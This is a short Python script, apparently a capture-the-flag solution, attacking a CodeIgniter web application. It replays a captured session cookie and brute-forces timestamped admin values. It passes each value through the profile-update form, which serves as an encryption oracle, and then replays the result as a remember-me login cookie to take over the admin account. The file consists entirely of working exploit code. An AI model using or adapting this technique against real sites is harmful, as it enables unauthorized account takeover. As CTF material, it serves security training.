import md5, requests

# We need a valid session to be able to use the oracle function. This was simply taken from a valid browser request
validsession = 'a%3A6%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22dc4699a237e9fe5203a9650ecfa39669%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A85%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A31.0%29+Gecko%2F20100101+Firefox%2F31.0+Iceweasel%2F31.4.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1429861840%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%228%22%3B%7Dc3dda5f632de395b06ad9e4b26a87d667feb42b6'

for month in range(4, 0, -1):
    for day in range(31, 0, -1):
        for hour in range(24, 0, -1):

            d = day
            if day < 10:
                d = "0"+str(day)
            
            h = hour
            if h < 10:
                h = "0" + str(h)
            
            # Construct a valid cookie
            val = "admin/0/"+"20150"+str(month)+str(d)+str(h);
            cookie = val + "--" + md5.new(val).hexdigest()

            print "Trying cookie: " + val
            
            # Set the correct cookie, and mimic a valid session.
            cookies = dict(nvisofileupload=validsession)
            data = dict(username='root', label=cookie, save="Save", password="" )
            # CodeIgniter uses the user agent in its session validation
            headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0'}
            page = requests.post("http://ctf.com/index.php/profile/update", cookies=cookies, data=data, headers=headers)
            
            # The encrypted admin cookie is now stored in the ComputerName cookie
            admincookie = page.cookies["ComputerName"]
            
            # Lets try logging in with it. Don't follow redirects
            cookies = dict(Remember=admincookie)
            page = requests.get("http://ctf.com/index.php/login/", cookies=cookies, allow_redirects=False)

            # If we would have been redirected to profile, the cookie was correct
            if page.status_code == 302:
                print "Found cookie:"
                print val
                print admincookie
            
                
print "Done scanning"